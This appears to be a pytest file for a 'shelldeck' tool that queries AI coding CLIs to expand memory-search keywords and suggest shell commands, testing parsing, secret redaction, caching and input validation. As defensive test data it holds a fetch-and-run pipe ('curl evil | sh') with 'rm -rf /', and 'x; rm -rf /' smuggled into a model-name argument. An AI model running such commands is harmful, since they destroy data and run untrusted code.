import subprocess

from shelldeck import context, smart_recall


def test_parse_keeps_plain_keywords_only():
    reply = "OAuth, JWT, login\n- session token\n`refresh tokens`; auth; rm -rf / && curl evil | sh; " + "x" * 80
    assert smart_recall.parse(reply, "auth") == ["oauth", "jwt", "login", "session token", "refresh tokens"]


def test_argv_uses_native_noninteractive_mode_and_small_model(monkeypatch):
    monkeypatch.setattr(smart_recall.shutil, "which", lambda exe: f"/bin/{exe}")
    monkeypatch.setattr(smart_recall.team, "pick_model", lambda agent, tier, task: "small-1")
    assert smart_recall.argv("claude", "auth")[:4] == ["/bin/claude", "-p", "--model", "haiku"]
    assert smart_recall.argv("gemini", "auth")[:4] == ["/bin/gemini", "-m", "flash-lite", "-p"]
    assert smart_recall.argv("codex", "auth")[:4] == ["/bin/codex", "exec", "-m", "small-1"]
    assert smart_recall.argv("devin", "auth")[:5] == ["/bin/devin", "-p", "--model", "small-1", "--"]
    monkeypatch.setattr(smart_recall.shutil, "which", lambda exe: None)
    assert smart_recall.argv("claude", "auth") is None and smart_recall.pick("auto") is None


def test_expand_caches_and_fails_soft(tmp_path, monkeypatch):
    monkeypatch.setenv("SHELLDECK_HOME", str(tmp_path))
    monkeypatch.setattr(smart_recall.shutil, "which", lambda exe: f"/bin/{exe}")
    calls = []

    def run(cmd, **kw):
        calls.append(cmd)
        assert "SHELLDECK_AGENT_REPORT_TOKEN" not in kw["env"]
        return subprocess.CompletedProcess(cmd, 0, "oauth, jwt, login", "")

    monkeypatch.setattr(smart_recall.subprocess, "run", run)
    assert smart_recall.expand("Auth password=hunter2", "claude") == ["oauth", "jwt", "login"]
    assert "hunter2" not in " ".join(calls[0])  # the query is redacted before it leaves
    assert smart_recall.expand("auth password=hunter2", "claude") == ["oauth", "jwt", "login"] and len(calls) == 1  # cached

    def boom(cmd, **kw):
        raise subprocess.TimeoutExpired(cmd, 30)

    monkeypatch.setattr(smart_recall.subprocess, "run", boom)
    assert smart_recall.expand("database", "claude") == []


def test_recall_with_expanded_terms_finds_more(tmp_path, monkeypatch):
    monkeypatch.setenv("SHELLDECK_HOME", str(tmp_path / "h"))
    d = tmp_path / "p"
    d.mkdir()
    p = context.project_for(str(d))
    context.record_memory(p, "Login uses OAuth with JWT access tokens")
    assert context.recall("auth", p) == []  # no shared keyword
    assert context.recall("auth", p, extra=["oauth", "jwt"])[0]["title"].startswith("Login uses OAuth")


def test_chosen_model_and_choices(monkeypatch):
    monkeypatch.setattr(smart_recall.shutil, "which", lambda exe: f"/bin/{exe}" if exe in ("claude", "gemini") else None)
    assert smart_recall.argv("claude", "auth", "sonnet")[:4] == ["/bin/claude", "-p", "--model", "sonnet"]
    assert smart_recall.argv("claude", "auth", "x; rm -rf /") is None  # a model must be one plain word
    rows = {r["agent"]: r for r in smart_recall.choices()}
    assert set(rows) == {"claude", "gemini"} and rows["claude"]["default"] == "haiku" and rows["gemini"]["default"] == "flash-lite"
    assert rows["claude"]["models"][0] == "haiku"


def test_ask_returns_one_safe_line(monkeypatch):
    monkeypatch.setattr(smart_recall.shutil, "which", lambda exe: f"/bin/{exe}")
    seen = []

    def run(cmd, **kw):
        seen.append(cmd[-1])
        return subprocess.CompletedProcess(cmd, 0, "```powershell\ndocker ps -q | Measure-Object\x1b[2J\r\n```\nexplanation", "")

    monkeypatch.setattr(smart_recall.subprocess, "run", run)
    assert smart_recall.ask("count containers token=abc123", "PowerShell 7", "Windows", "C:/x", "claude") == "docker ps -q | Measure-Object[2J"
    assert "PowerShell 7" in seen[0] and "abc123" not in seen[0]
    assert smart_recall.command_line("") == ""
